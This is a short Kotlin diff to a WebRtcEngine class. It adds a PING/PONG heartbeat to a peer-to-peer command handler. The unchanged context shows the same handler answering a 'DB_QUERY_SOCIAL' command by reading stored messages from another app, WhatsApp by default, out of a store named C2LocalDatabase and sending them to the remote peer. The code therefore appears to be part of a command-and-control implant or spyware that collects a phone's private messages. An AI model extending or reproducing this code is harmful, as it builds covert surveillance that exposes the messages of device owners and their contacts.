@@ -268,6 +268,14 @@ class WebRtcEngine(
                             put("data", try { JSONObject(responseContent) } catch (_: Exception) { try { org.json.JSONArray(responseContent) } catch (_: Exception) { responseContent } })
                         }
                         sendP2pMessage("API_RESPONSE", resPayload)
+                    } else if (type == "PING") {
+                        val reqTs = req.optLong("timestamp", System.currentTimeMillis())
+                        val pongPayload = JSONObject().apply {
+                            put("timestamp", reqTs)
+                            put("deviceTime", System.currentTimeMillis())
+                            put("status", "ACTIVE")
+                        }
+                        sendP2pMessage("PONG", pongPayload)
                     } else if (type == "DB_QUERY_SOCIAL") {
                         val appKey = req.optString("appKey", "whatsapp")
                         val messagesArray = C2LocalDatabase.getInstance(context).getSocialMessagesJson(appKey)
